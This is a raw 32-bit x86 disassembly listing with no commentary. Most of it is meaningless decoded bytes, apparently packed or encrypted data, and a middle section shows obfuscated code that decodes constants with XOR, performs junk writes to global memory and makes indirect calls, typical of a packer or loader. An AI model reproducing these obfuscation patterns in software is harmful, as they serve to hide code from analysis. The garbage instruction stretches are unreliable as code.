  40635c:	fcomp  QWORD PTR [edi+edi*4]
  40635f:	jno    0x40637a
  406361:	and    al,BYTE PTR [ebx+0xd]
  406364:	pusha  
  406365:	jae    0x4063d8
  406367:	push   DWORD PTR [edx-0x7a2136c0]
  40636d:	cmc    
  40636e:	lds    ebx,FWORD PTR [edx]
  406370:	jp     0x406396
  406372:	mov    ecx,0x391284bf
  406377:	xor    ch,al
  406379:	mov    BYTE PTR [esi-0x60],cl
  40637c:	or     dh,BYTE PTR [ebx-0x5a]
  40637f:	jae    0x406330
  406381:	rcr    BYTE PTR [esi],1
  406383:	inc    eax
  406384:	fdiv   QWORD PTR [edx-0x1e8d838e]
  40638a:	mov    bh,ah
  40638c:	lods   eax,DWORD PTR ds:[esi]
  40638d:	or     edi,ebx
  40638f:	mov    BYTE PTR [eax-0x5ee13972],dh
  406395:	pop    eax
  406396:	retf   
  406397:	ja     0x406353
  406399:	retf   0x5e77
  40639c:	dec    ebp
  40639d:	fimul  WORD PTR [ecx]
  40639f:	mov    ebp,0x854bc7bc
  4063a4:	ss mov ebx,0x9ec949f6
  4063aa:	into   
  4063ab:	aam    0xb2
  4063ad:	out    0x6f,al
  4063af:	jnp    0x4063cb
  4063b1:	push   cs
  4063b2:	or     dh,dl
  4063b4:	js     0x40639c
  4063b6:	loope  0x406360
  4063b8:	call   0x7f7f:0xeb54
  4063be:	test   eax,0x823308ff
  4063c3:	dec    eax
  4063c4:	ja     0x406349
  4063c6:	mov    es,WORD PTR [ecx+eax*4-0x14503ce9]
  4063cd:	inc    esi
  4063ce:	push   eax
  4063cf:	sub    eax,0x971a0a27
  4063d4:	sbb    BYTE PTR [ebp-0x53],ch
  4063d7:	in     al,dx
  4063d8:	cmp    ch,BYTE PTR [ecx+0x1e]
  4063db:	mov    bl,0x94
  4063dd:	pop    es
  4063de:	sbb    al,0xef
  4063e0:	aas    
  4063e1:	pushf  
  4063e2:	shl    eax,cl
  4063e4:	int3   
  4063e5:	or     al,0x9f
  4063e7:	xchg   edx,eax
  4063e8:	jmp    0xd656:0x2f54dc5a
  4063ef:	xchg   ah,dl
  4063f1:	mov    ecx,0xfb2e1d04
  4063f6:	aad    0xa6
  4063f8:	mov    dh,0xdf
  4063fa:	and    ebx,DWORD PTR [edx+0x3d8b4c4a]
  406400:	(bad)  
  406401:	dec    edx
  406402:	jne    0x40647b
  406404:	retf   
  406405:	lock lock repnz leave 
  406409:	cmp    eax,0xfdce076f
  40640e:	mov    bh,0xcd
  406410:	out    0x8f,eax
  406412:	adc    edi,DWORD PTR [esi+esi*1+0x72f1a54f]
  406419:	clc    
  40641a:	mov    ecx,ss
  40641c:	sub    eax,edi
  40641e:	lock push ebp
  406420:	mov    esp,0x66efacf7
  406425:	push   0xfffffff8
  406427:	retf   0xb7d
  40642a:	push   edx
  40642b:	pusha  
  40642c:	bound  esp,QWORD PTR [ebx-0x9]
  40642f:	push   eax
  406430:	push   ebx
  406431:	push   ds
  406432:	and    edi,DWORD PTR [ebx+0x13df69a2]
  406438:	ret    0x31ae
  40643b:	or     eax,0xadfb32aa
  406440:	mov    dl,0x2e
  406442:	cmp    BYTE PTR [esi+0x13],0x76
  406446:	mov    DWORD PTR [ebp-0x20],eax
  406449:	xor    DWORD PTR ds:0x434286,0x4325f4
  406453:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  40645a:	mov    DWORD PTR [ebp-0x34],0xf89f0531
  406461:	mov    DWORD PTR [ebp-0x2c],0xf89c85f1
  406468:	xor    DWORD PTR ds:0x432ce2,edx
  40646e:	mov    DWORD PTR [ebp-0x24],0xf89c85d1
  406475:	xor    eax,DWORD PTR ds:0x43429a
  40647b:	mov    eax,DWORD PTR [ebp-0xc]
  40647e:	sub    DWORD PTR ds:0x432ce2,0x4325f0
  406488:	xor    eax,esi
  40648a:	add    DWORD PTR ds:0x4325f0,0x5eb6
  406494:	add    eax,edi
  406496:	adc    DWORD PTR ds:0x432cd6,0x2bbb
  4064a0:	mov    DWORD PTR [ebp-0x18],eax
  4064a3:	mov    DWORD PTR [ebp-0x1c],0xf89c853c
  4064aa:	sbb    eax,0x6f73
  4064af:	mov    BYTE PTR [ebp-0x1],0x67
  4064b3:	or     eax,0xf78
  4064b8:	mov    eax,DWORD PTR [ebp-0xc]
  4064bb:	xor    eax,esi
  4064bd:	add    eax,edi
  4064bf:	mov    DWORD PTR [ebp-0x18],eax
  4064c2:	neg    eax
  4064c4:	mov    eax,DWORD PTR [ebp-0x24]
  4064c7:	sbb    DWORD PTR ds:0x4325ec,0x6660
  4064d1:	xor    eax,esi
  4064d3:	add    eax,edi
  4064d5:	sub    DWORD PTR ds:0x43432d,0x50c
  4064df:	push   eax
  4064e0:	sbb    DWORD PTR ds:0x4325f0,edx
  4064e6:	mov    eax,DWORD PTR [ebp-0x28]
  4064e9:	sub    DWORD PTR ds:0x432cd2,0x7292
  4064f3:	xor    eax,esi
  4064f5:	adc    DWORD PTR ds:0x43428e,0x434315
  4064ff:	add    eax,edi
  406501:	push   eax
  406502:	add    DWORD PTR ds:0x434286,ebx
  406508:	mov    eax,DWORD PTR [ebp-0x1c]
  40650b:	add    DWORD PTR ds:0x432cbe,0x432ce6
  406515:	xor    eax,esi
  406517:	add    eax,edi
  406519:	add    DWORD PTR ds:0x434311,0x43431d
  406523:	push   eax
  406524:	lea    eax,[ebp-0x78]
  406527:	push   eax
  406528:	push   DWORD PTR [ebp-0xc]
  40652b:	adc    DWORD PTR ds:0x434286,0x78bf
  406535:	push   DWORD PTR [ebp-0x14]
  406538:	call   0x4055a2
  40653d:	sub    DWORD PTR ds:0x43429a,0x4325fc
  406547:	jmp    0x406894
  40654c:	test   al,0x25
  40654e:	xor    al,0x4
  406550:	mov    cl,0x11
  406552:	test   al,0xb1
  406554:	push   ebx
  406555:	fcmovb st,st(7)
  406557:	fistp  QWORD PTR [eax+0x40]
  40655a:	(bad)  [ebx+ebp*2+0x2070703e]
  406561:	jge    0x4065d3
  406563:	jo     0x406528
  406565:	ins    BYTE PTR es:[edi],dx
  406566:	fcmovb st,st(5)
  406568:	js     0x4065a3
  40656a:	aas    
  40656b:	lahf   
  40656c:	push   cs
  40656d:	xchg   edi,eax
  40656e:	stc    
  40656f:	ja     0x4065ca
  406571:	jnp    0x4065c5
  406573:	jns    0x40652b
  406575:	dec    esp
  406576:	loopne 0x40652a
  406578:	dec    ecx
  406579:	dec    eax
  40657a:	bswap  esi
  40657c:	gs clc 
  40657e:	pop    es
  40657f:	cmp    esp,DWORD PTR [esi-0x21]
  406582:	add    DWORD PTR [edi+0x37],esi
  406585:	ins    DWORD PTR es:[edi],dx
  406586:	push   edi
  406587:	dec    esp
  406588:	pop    ebx
  406589:	bound  eax,QWORD PTR [ecx+0x17]
  40658c:	xchg   edx,eax
  40658d:	mov    ah,0x86
  40658f:	xor    cl,dl
  406591:	daa    
  406592:	sbb    ebx,eax
  406594:	data16 aad 0x69
  406597:	mov    ecx,0x1c6e2d20
  40659c:	div    BYTE PTR [edx+0x6215dec6]
  4065a2:	pop    esp
  4065a3:	sbb    edx,DWORD PTR [esp+esi*4+0x55b656c0]
  4065aa:	push   ds
  4065ab:	sub    eax,0xcd9f846b
  4065b0:	xchg   BYTE PTR [ebx-0x349b79b8],ah
  4065b6:	jp     0x406552
  4065b8:	in     ax,dx
  4065ba:	imul   edi,esi,0x51
  4065bd:	pop    ds
  4065be:	lds    bp,DWORD PTR [esi-0x39ef1efd]
  4065c5:	fwait
  4065c6:	sbb    ecx,DWORD PTR ds:0x99cdf312
  4065cc:	xor    dl,ch
  4065ce:	cmp    eax,DWORD PTR [ebx]
  4065d0:	sbb    ebp,esp
  4065d2:	pop    ds
  4065d3:	sub    bh,cl
  4065d5:	sbb    esp,ecx
  4065d7:	mov    ah,0x18
  4065d9:	and    DWORD PTR ds:0x31b85768,ebp
  4065df:	push   esp
  4065e0:	xchg   edi,eax
  4065e1:	retf   0xd2fb
  4065e4:	push   esi
  4065e5:	jns    0x4065d3
  4065e7:	ret    
  4065e8:	pop    ebx
  4065e9:	sbb    DWORD PTR [eax],esi
  4065eb:	data16 jnp 0x406640
  4065ee:	lea    eax,[edi]
  4065f0:	jo     0x406597
  4065f2:	push   cs
  4065f3:	xchg   edx,eax
  4065f4:	jbe    0x406662
  4065f6:	fstp   TBYTE PTR [ebp+0x61]
  4065f9:	jne    0x406653
  4065fb:	cmc    
  4065fc:	repnz lods al,BYTE PTR ds:[esi]
  4065fe:	adc    al,0x38
  406600:	in     al,dx
  406601:	popa   
  406602:	rcl    DWORD PTR [edx],0x66
  406605:	dec    eax
  406606:	test   eax,0xe3a338b0
  40660b:	adc    ecx,edi
  40660d:	lea    ebp,[eax]
  40660f:	pop    ebp
  406610:	dec    ebp
  406611:	pusha  
  406612:	mov    edx,0xb0abd160
  406617:	mov    edi,0x2bb090c5
  40661c:	dec    edi
  40661d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40661e:	jno    0x40667c
  406620:	idiv   DWORD PTR [ecx+0x60]
  406623:	test   DWORD PTR [ecx-0x6f7a55ca],ecx
  406629:	or     BYTE PTR [ebp-0x59844d7a],0x2d
  406630:	sub    DWORD PTR [ecx+0x647238f4],esp
  406636:	ret    0x7921
  406639:	sbb    eax,0xd8be0735
  40663e:	xchg   dh,al
  406640:	sub    DWORD PTR [ecx-0x17ea1e7],0x2ba07ea3
  40664a:	pusha  
  40664b:	ja     0x406682
  40664d:	inc    ecx
  40664e:	adc    edi,DWORD PTR [eax+0x70e1ecb0]
  406654:	fsub   st,st(7)
  406656:	lea    esi,[edi+0x69]
  406659:	rcl    BYTE PTR [esi-0x4cd55655],0x75
  406660:	jmp    0x406648
  406662:	xor    bp,bx
  406665:	mov    cl,0x67
  406667:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406668:	les    ebp,FWORD PTR [ebp+eiz*8+0x18]
  40666c:	push   ds
  40666d:	or     ebx,DWORD PTR [eax-0x1f94b260]
  406673:	jmp    0x4066da
  406675:	in     al,dx
  406676:	mov    ch,0x33
  406678:	push   es
  406679:	push   eax
  40667a:	pusha  
  40667b:	xchg   edx,eax
  40667c:	mov    ebx,0xb4439e8d
  406681:	xchg   DWORD PTR [ebp+eax*2-0x58d04d7b],ecx
  406688:	(bad)  
  406689:	out    dx,al
  40668a:	enter  0x125d,0x8f
  40668e:	jmp    0xcb34ea06
  406693:	lds    esp,FWORD PTR [esi]
  406695:	mov    ch,0xbc
  406697:	stos   DWORD PTR es:[edi],eax
  406698:	ror    BYTE PTR ds:0x531ab7b5,1
  40669e:	sbb    DWORD PTR [edi+0x3d],edi
  4066a1:	out    0x83,al
  4066a3:	and    BYTE PTR [eax+0x1a38cc53],al
  4066a9:	leave  
  4066aa:	cs aad 0x1
  4066ad:	stos   BYTE PTR es:[edi],al
  4066ae:	jns    0x406680
  4066b0:	mov    ebp,0xf1331d28
  4066b5:	neg    DWORD PTR [edx-0x2c26806e]
  4066bb:	dec    eax
  4066bc:	push   edx
  4066bd:	fmul   st(4),st
  4066bf:	add    al,0x4d
  4066c1:	jle    0x406663
  4066c3:	inc    esi
  4066c4:	pusha  
  4066c5:	jne    0x40672a
  4066c7:	adc    al,0x16
  4066c9:	aaa    
  4066ca:	cmp    ebp,DWORD PTR [ecx]
  4066cc:	add    eax,0x6267d5a6
  4066d1:	in     al,dx
  4066d2:	fs mov ecx,0x60b84f2c
  4066d8:	mov    edi,0x668668d7
  4066dd:	cmp    cl,BYTE PTR [edi]
  4066df:	mov    cl,0x7b
  4066e1:	fist   WORD PTR ds:0xf159178f
  4066e7:	jno    0x4066a1
  4066e9:	and    al,0x2a
  4066eb:	aam    0xa4
  4066ed:	out    0x42,eax
  4066ef:	xchg   DWORD PTR [ecx],ecx
  4066f1:	xor    DWORD PTR [edx+0x6],ecx
  4066f4:	ss xchg esp,eax
  4066f6:	shl    DWORD PTR [ebp-0x48],0x48
  4066fa:	aaa    
  4066fb:	pop    es
  4066fc:	pop    edx
  4066fd:	mov    ecx,0x28ee368
  406702:	lea    edx,[ebx-0x29]
  406705:	daa    
  406706:	std    
  406707:	pop    esi
  406708:	jecxz  0x406764
  40670a:	arpl   WORD PTR [esi+ebp*2-0x13b70735],cx
  406711:	jecxz  0x406717
  406713:	jp     0x40669e
  406715:	je     0x40670f
  406717:	imul   BYTE PTR [ecx]
  406719:	mov    edx,0x4d8f2fc0
  40671e:	iret   
  40671f:	add    eax,0x2ebc266b
  406724:	fdivr  QWORD PTR [ebx+0x1ef71aed]
  40672a:	adc    eax,0xe1a9ccdf
  40672f:	fadd   st,st(3)
  406731:	pop    ebp
  406732:	sbb    ah,cl
  406734:	retf   
  406735:	sub    cl,ah
  406737:	pop    esi
  406738:	in     al,dx
  406739:	inc    edi
  40673a:	clc    
  40673b:	lock test al,0xe6
  40673e:	pop    edi
  40673f:	outs   dx,BYTE PTR ds:[esi]
  406740:	lods   eax,DWORD PTR ds:[esi]
  406741:	pop    edi
  406742:	dec    BYTE PTR [eax+0x5a14482]
  406748:	loopne 0x4066e5
  40674a:	jp     0x40675d
  40674c:	pop    esi
  40674d:	and    bh,bl
  40674f:	out    0x42,eax
  406751:	(bad)  
  406752:	mov    ebp,0x577a1c5b
  406757:	mov    bl,0x5f
  406759:	sub    eax,0xb4a3b035
  40675e:	shl    BYTE PTR [ebx+0x19],1
  406761:	adc    ebx,DWORD PTR [ecx+0x49]
  406764:	fmul   DWORD PTR [ecx-0x776fb3e4]
  40676a:	sbb    eax,esi
  40676c:	inc    ebp
  40676d:	inc    edi
  40676e:	mov    edi,ebp
  406770:	push   cs
  406771:	sub    bl,bl
  406773:	xchg   ebp,eax
  406774:	icebp  
  406775:	cwde   
  406776:	lahf   
  406777:	pop    ebp
  406778:	scas   eax,DWORD PTR es:[edi]
  406779:	ss and al,0xf3
  40677c:	ret    0xa7af
  40677f:	pop    ebp
  406780:	or     al,0xf8
  406782:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406783:	add    ebx,DWORD PTR [edi+0x45]
  406786:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406787:	sbb    BYTE PTR [eax+esi*8+0x296803e0],dh
  40678e:	pop    esp
  40678f:	push   ebp
  406790:	scas   al,BYTE PTR es:[edi]
  406791:	mov    BYTE PTR [ebx],bh
  406793:	push   eax
  406794:	clc    
  406795:	jg     0x4067ea
  406797:	mov    al,0x1f
  406799:	or     esi,eax
  40679b:	push   ebp
  40679c:	pop    ebx
  40679d:	retf   0xed77
  4067a0:	sbb    eax,DWORD PTR [ecx]
  4067a2:	js     0x4067fe
  4067a4:	in     al,0xde
  4067a6:	push   esi
  4067a7:	adc    al,0xb4
  4067a9:	push   ds
  4067aa:	aas    
  4067ab:	ret    
  4067ac:	mov    ds:0x8a4b655a,al
  4067b1:	fistp  QWORD PTR [edi]
  4067b3:	mov    ebx,0xfb5b0ca7
  4067b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067b9:	shl    BYTE PTR [eax-0x47],cl
  4067bc:	(bad)  
  4067bd:	pop    ebx
  4067be:	xor    DWORD PTR [edx+0x0],esp
  4067c1:	es pop ebx
  4067c3:	and    dh,BYTE PTR [ebp-0x24ddeb17]
  4067c9:	clc    
  4067ca:	mov    ebx,0xfce1bf8c
  4067cf:	or     dh,BYTE PTR [esi-0x46]
  4067d2:	inc    edi
  4067d3:	sbb    ebp,DWORD PTR ds:0x5b1ac268
  4067d9:	fcmovnu st,st(6)
  4067db:	fs push cs
  4067dd:	inc    esp
  4067de:	not    BYTE PTR [esi+ebx*4]
  4067e1:	cmp    ah,ch
  4067e3:	sub    ch,BYTE PTR [edx+0x6e355b08]
  4067e9:	push   ds
  4067ea:	sub    eax,0x19ff4d38
  4067ef:	in     al,0x70
  4067f1:	mov    eax,ds:0x42f79599
  4067f6:	enter  0x9c6f,0xe7
  4067fa:	adc    eax,0x42bcb319
  4067ff:	mov    dh,0x30
  406801:	jno    0x406827
  406803:	or     ebx,esi
  406805:	xor    dl,BYTE PTR [edi]
  406807:	jp     0x40687b
  406809:	lock cmp BYTE PTR [ecx-0x4d3dec8d],dl
  406810:	mov    eax,ds:0xb4081d94
  406815:	mov    ds:0x40db1c9e,al
  40681a:	adc    ebx,DWORD PTR [ecx-0x43]
  40681d:	daa    
  40681e:	sub    al,0x9a
  406820:	lahf   
  406821:	rol    DWORD PTR [edx+0x75],1
  406824:	mov    eax,0x3679230f
  406829:	fstp   TBYTE PTR [edx-0x2e430b55]
  40682f:	sbb    eax,0x1071fa4f
  406834:	stc    
  406835:	sti    
  406836:	inc    ebx
  406837:	jo     0x406878
  406839:	pop    ss
  40683a:	rol    DWORD PTR [edx-0x34],0xe3
  40683e:	ss mov esi,0x13651827
  406844:	mov    bh,0xf7
  406846:	xor    BYTE PTR [ebp+0x34],dl
  406849:	aas    
  40684a:	addr16 adc al,0xb7
  40684d:	daa    
  40684e:	clc    
  40684f:	mov    ch,0x21
  406851:	mov    dh,0xc9
  406853:	shl    DWORD PTR [esi+0x6a],0xde
  406857:	pop    ds
  406858:	ja     0x4068b5
  40685a:	lea    edi,[eax+0x4b]
  40685d:	sub    BYTE PTR [eax],cl
  40685f:	sbb    eax,0xb31dafd7
  406864:	mov    WORD PTR [eax],ds
  406866:	add    bh,al
  406868:	out    0x23,eax
  40686a:	xor    bl,ch
  40686c:	inc    eax
  40686d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40686e:	dec    eax
  40686f:	cmc    
  406870:	sub    cl,cl
  406872:	mov    cl,0x56
  406874:	mov    al,ds:0xca012aa3
  406879:	(bad)  
  40687a:	sbb    BYTE PTR [ebx+eiz*4],ah
  40687d:	(bad)  
  40687e:	push   0x3902045a
  406883:	mov    esp,0x46dd476b
  406888:	dec    eax
  406889:	mov    fs,WORD PTR [ebx]
  40688b:	outs   dx,DWORD PTR ds:[esi]
  40688c:	rcr    BYTE PTR [eax],cl
  40688e:	dec    eax
  40688f:	nop
  406890:	sub    DWORD PTR [edx],edx
  406892:	mov    ch,0x7b
  406894:	test   eax,eax
  406896:	mov    DWORD PTR ds:0x434325,0x7971
  4068a0:	je     0x406953
  4068a6:	lea    eax,[ebp-0x78]
  4068a9:	sbb    DWORD PTR ds:0x432cca,0x1ea3
  4068b3:	push   eax
  4068b4:	sbb    DWORD PTR ds:0x432ce6,0x1ec2
  4068be:	mov    eax,DWORD PTR [ebp-0x14]
  4068c1:	and    DWORD PTR ds:0x432ce2,0x7d59
  4068cb:	xor    eax,esi
  4068cd:	add    eax,edi
  4068cf:	push   eax
  4068d0:	mov    DWORD PTR ds:0x434266,0x11
  4068da:	cmp    DWORD PTR ds:0x434266,0x0
  4068e1:	je     0x406937
  4068e7:	cmp    DWORD PTR ds:0x434266,0x6
  4068ee:	jne    0x40690c
  4068f4:	push   0x434321
  4068f9:	push   DWORD PTR [ebp-0xc]
  4068fc:	push   0x55d8
  406901:	push   0x8f3f
  406906:	call   DWORD PTR ds:0x432b3a
  40690c:	cmp    DWORD PTR ds:0x434266,0x7
  406913:	jne    0x406924
  406919:	mov    eax,ds:0x434266
  40691e:	dec    eax
  40691f:	mov    ds:0x434266,eax
  406924:	xor    eax,eax
  406926:	add    eax,DWORD PTR ds:0x434266
  40692c:	dec    eax
  40692d:	mov    ds:0x434266,eax
  406932:	jmp    0x4068da
  406937:	mov    eax,DWORD PTR [ebp-0x10]
  40693a:	add    eax,0xaa
  40693f:	push   eax
  406940:	mov    eax,DWORD PTR [ebp-0x10]
  406943:	mov    eax,DWORD PTR [eax+0x198]
  406949:	push   DWORD PTR [eax]
  40694b:	call   0x40d076
  406950:	mov    DWORD PTR [ebp-0x8],eax
  406953:	cmp    DWORD PTR [ebp-0x8],0x0
  406957:	lea    eax,[ebp+0x4]
  40695a:	mov    DWORD PTR [ebp-0x20],eax
  40695d:	je     0x407755
  406963:	lea    eax,[ebp-0x18]
  406966:	push   eax
  406967:	mov    eax,DWORD PTR [ebp-0x2c]
  40696a:	xor    eax,esi
  40696c:	add    eax,edi
  40696e:	push   eax
  40696f:	mov    eax,DWORD PTR [ebp-0x1c]
  406972:	xor    eax,esi
  406974:	add    eax,edi
  406976:	push   eax
  406977:	push   DWORD PTR [ebp-0x8]
  40697a:	lea    eax,[ebp-0x78]
  40697d:	push   eax
  40697e:	jmp    0x406ccb
  406983:	mov    esi,?
  406985:	add    BYTE PTR [esi+0xa],bh
  406988:	mov    cs,WORD PTR [edx+0x39f75e8a]
  40698e:	aaa    
  40698f:	cld    
  406990:	sbb    DWORD PTR [ecx],edx
  406992:	stos   DWORD PTR es:[edi],eax
  406993:	sbb    edi,DWORD PTR [edx]
  406995:	jo     0x406a07
  406997:	and    BYTE PTR [ebp+0x70],bh
  40699a:	jo     0x406a02
  40699c:	frstor [edi+0xb]
  40699f:	mov    ds,ebx
  4069a1:	add    BYTE PTR [esi-0x2c601e6a],dh
  4069a7:	outs   dx,BYTE PTR ds:[esi]
  4069a8:	out    0x37,al
  4069aa:	fst    DWORD PTR [edi]
  4069ac:	mov    bl,0x73
  4069ae:	mov    eax,ds:0xe721c3a1
  4069b3:	jle    0x406950
  4069b5:	mov    ebp,0x13976e66
  4069ba:	aaa    
  4069bb:	dec    edi
  4069bc:	into   
  4069bd:	pop    ss
  4069be:	mov    dl,0x72
  4069c0:	test   DWORD PTR [edx],edx
  4069c2:	push   0x37278a4d
  4069c7:	popa   
  4069c8:	jp     0x406a0e
  4069ca:	adc    edx,edx
  4069cc:	ins    DWORD PTR es:[edi],dx
  4069cd:	les    edx,FWORD PTR [esi+edx*2+0x45]
  4069d1:	ror    BYTE PTR [ecx-0x5d],cl
  4069d4:	popf   
  4069d5:	push   edi
  4069d6:	mov    dh,0x67
  4069d8:	lahf   
  4069d9:	outs   dx,BYTE PTR ds:[esi]
  4069da:	hlt    
  4069db:	mov    bh,BYTE PTR [edx-0x372b742]
  4069e1:	iret   
  4069e2:	mov    cl,0xcf
  4069e4:	into   
  4069e5:	dec    esp
  4069e6:	jns    0x40696c
  4069e8:	enter  0xe857,0xdb
  4069ec:	call   0xc29a0f09
  4069f1:	xor    bl,dh
  4069f3:	mov    DWORD PTR ds:[esi+edx*2],esi
  4069f7:	pop    ss
  4069f8:	push   edx
  4069f9:	sub    eax,0xfcd8202e
  4069fe:	xchg   edi,eax
  4069ff:	icebp  
  406a00:	mov    ah,0x3a
  406a02:	sub    bl,ah
  406a04:	pop    ss
  406a05:	or     DWORD PTR [ecx+0x42],ebp
  406a08:	loopne 0x4069e8
  406a0a:	xor    esi,DWORD PTR [ecx+0x4c]
  406a0d:	aas    
  406a0e:	add    eax,0xe7bdf47c
  406a13:	inc    ebp
  406a14:	nop
  406a15:	or     al,0xfb
  406a17:	push   es
  406a18:	push   ebx
  406a19:	bound  esp,QWORD PTR [ebx]
  406a1b:	test   edx,esp
  406a1d:	jne    0x4069b9
  406a1f:	jo     0x406a74
  406a21:	dec    esi
  406a22:	xor    al,0x26
  406a24:	(bad)
  406a27:	sbb    dl,BYTE PTR [eax+0x38]
  406a2a:	add    ch,BYTE PTR [ebx]
  406a2c:	sahf   
  406a2d:	in     eax,0xbb
  406a2f:	add    al,0xc5
  406a31:	sbb    bl,BYTE PTR [ebx-0x2876fc2]
  406a37:	mov    ah,0x8a
  406a39:	sbb    al,0x45
  406a3b:	cmp    ebp,DWORD PTR [edx+0x40f85231]
  406a41:	shr    al,1
  406a43:	mov    al,ds:0xbc45806
  406a48:	in     eax,0x3
  406a4a:	add    dl,BYTE PTR cs:[bx+di]
  406a4e:	jns    0x406a2e
  406a50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a51:	mov    eax,DWORD PTR [ebp+0x71a62a42]
  406a57:	fidiv  DWORD PTR [ebp-0x4152ae88]
  406a5d:	pop    ebp
  406a5e:	xchg   esi,eax
  406a5f:	cmc    
  406a60:	test   eax,0x83563c26
  406a65:	(bad)  
  406a66:	std    
  406a67:	fst    QWORD PTR gs:[edx+0xe]
  406a6b:	add    BYTE PTR [edi+0x69cd10e6],bl
  406a71:	sub    al,0xd7
  406a73:	addr16 pop ecx
  406a75:	fisttp QWORD PTR [ebp-0x61686811]
  406a7b:	inc    edi
  406a7c:	jbe    0x406a17
  406a7e:	in     eax,0x2e
  406a80:	imul   edx,DWORD PTR ds:0x11edc90f,0x3da70c02
  406a8a:	inc    esi
  406a8b:	inc    ecx
  406a8c:	xchg   ebp,eax
  406a8d:	mov    eax,ds:0xe8b5b62e
  406a92:	jmp    0x406ad3
  406a94:	popa   
  406a95:	sub    al,0xf4
  406a97:	sub    al,0x8a
  406a99:	push   ss
  406a9a:	lods   eax,DWORD PTR ds:[esi]
  406a9b:	test   eax,0x20ebebfe
  406aa0:	pop    edi
  406aa1:	cwde   
  406aa2:	jno    0x406ab1
  406aa4:	sti    
  406aa5:	sbb    eax,0x4219ab4f
  406aaa:	mov    ds:0xa1e24430,al
  406aaf:	std    
  406ab0:	mov    ds:0x16dd2f66,al
  406ab5:	iret   
  406ab6:	inc    ebp
  406ab7:	mov    DWORD PTR [esp+edi*4-0x49fa242a],eax
  406abe:	push   edi
  406abf:	sbb    eax,0xade4cae9
  406ac4:	xchg   edx,eax
  406ac5:	lds    edx,FWORD PTR [esi+eax*8-0x485f08c6]
  406acc:	push   esp
  406acd:	ins    BYTE PTR es:[edi],dx
  406ace:	mov    DWORD PTR [edx],esi
  406ad0:	sbb    eax,0x67b02bb9
  406ad5:	int3   
  406ad6:	daa    
  406ad7:	(bad)  
  406ad8:	repz dec eax
  406ada:	fdiv   DWORD PTR [edi+0x2e]
  406add:	scas   eax,DWORD PTR es:[edi]
  406ade:	sub    al,0x8c
  406ae0:	leave  
  406ae1:	inc    ecx
  406ae2:	sar    ah,cl
  406ae4:	cmp    al,0x52
  406ae6:	retf   
  406ae7:	scas   eax,DWORD PTR es:[edi]
  406ae8:	mov    ebx,0xf416b10c
  406aed:	call   FWORD PTR [ebx-0x69090374]
  406af3:	xor    BYTE PTR [eax+0x5e62e13e],cl
  406af9:	add    ch,dh
  406afb:	shl    BYTE PTR [edi+eiz*8+0x35e0fa4e],0x86
  406b03:	shr    bl,cl
  406b05:	jg     0x406b78
  406b07:	aad    0x3b
  406b09:	mov    edx,0xe8fabd70
  406b0e:	outs   dx,BYTE PTR ds:[esi]
  406b0f:	push   ss
  406b10:	addr16 mov ds:0xfb75,al
  406b14:	and    esi,ebx
  406b16:	or     edx,esi
  406b18:	dec    esp
  406b19:	xor    ch,ch
  406b1b:	xor    edx,esp
  406b1d:	popa   
  406b1e:	inc    edx
  406b1f:	scas   eax,DWORD PTR es:[edi]
  406b20:	lea    ecx,gs:[esi+esi*4]
  406b24:	xchg   ebp,eax
  406b25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b26:	sub    BYTE PTR [esi+0x6d68906f],0x52
  406b2d:	nop
  406b2e:	push   ds
  406b2f:	push   ebp
  406b30:	jb     0x406b46
  406b32:	loopne 0x406aed
  406b34:	sbb    dl,bl
  406b36:	push   ds
  406b37:	push   0x72597ddd
  406b3c:	enter  0xf432,0x8e
  406b40:	(bad)  
  406b41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b42:	stos   BYTE PTR es:[edi],al
  406b43:	mov    ch,0x42
  406b45:	les    edi,FWORD PTR [esi+0x266cdc44]
  406b4b:	mov    WORD PTR [ebx-0x1],cs
  406b4e:	xchg   esi,eax
  406b4f:	sub    eax,0xfbe22ce9
  406b54:	ror    edi,cl
  406b56:	aaa    
  406b57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b58:	push   edx
  406b59:	pusha  
  406b5a:	es mov cl,0xfb
  406b5d:	or     bl,ch
  406b5f:	hlt    
  406b60:	sub    al,0x49
  406b62:	(bad)  
  406b64:	push   ebx
  406b65:	inc    ecx
  406b66:	jo     0x406bbe
  406b68:	mov    ebp,0x1e9642
  406b6d:	or     BYTE PTR [edx-0x7269fa66],dl
  406b73:	xor    al,0x17
  406b75:	dec    ecx
  406b76:	add    esp,ecx
  406b78:	(bad)  
  406b79:	sti    
  406b7a:	fbstp  TBYTE PTR [ebx+0x7f]
  406b7d:	enter  0x6fed,0xbd
  406b81:	je     0x406bf7
  406b83:	pop    ebx
  406b84:	inc    eax
  406b85:	ins    DWORD PTR es:[edi],dx
  406b86:	(bad)  
  406b87:	jg     0x406bb0
  406b89:	and    al,0x47
  406b8b:	mov    al,ds:0x5ead4fb6
  406b90:	mov    ds:0xb5dfcf5d,eax
  406b95:	pushf  
  406b96:	push   0xcc42431c
  406b9b:	test   al,0xad
  406b9d:	imul   ecx,esp,0xf72d462c
  406ba3:	lahf   
  406ba4:	shl    bh,cl
  406ba6:	inc    esp
  406ba7:	ds call 0xd426:0x1cb43156
  406baf:	fwait
  406bb0:	test   DWORD PTR [edi+0x35],eax
  406bb3:	js     0x406c22
  406bb5:	pop    ds
  406bb6:	or     ebx,DWORD PTR [edx+0xf68841]
  406bbc:	inc    ecx
  406bbd:	inc    esi
  406bbe:	jecxz  0x406bd4
  406bc0:	xor    ebx,DWORD PTR [esi]
  406bc2:	jo     0x406bae
  406bc4:	push   edx
  406bc5:	cli    
  406bc6:	scas   al,BYTE PTR es:[edi]
  406bc7:	or     al,0xec
  406bc9:	jle    0x406b6a
  406bcb:	sub    BYTE PTR [ebx-0x17e9a8ba],0x5
  406bd2:	ins    BYTE PTR es:[edi],dx
  406bd3:	push   edi
  406bd4:	and    BYTE PTR [edi+0x49],al
  406bd7:	arpl   WORD PTR [ebx+0x607b2931],bx
  406bdd:	mov    ecx,0xd7954af4
  406be2:	test   BYTE PTR [edi-0x60],ah
  406be5:	out    dx,eax
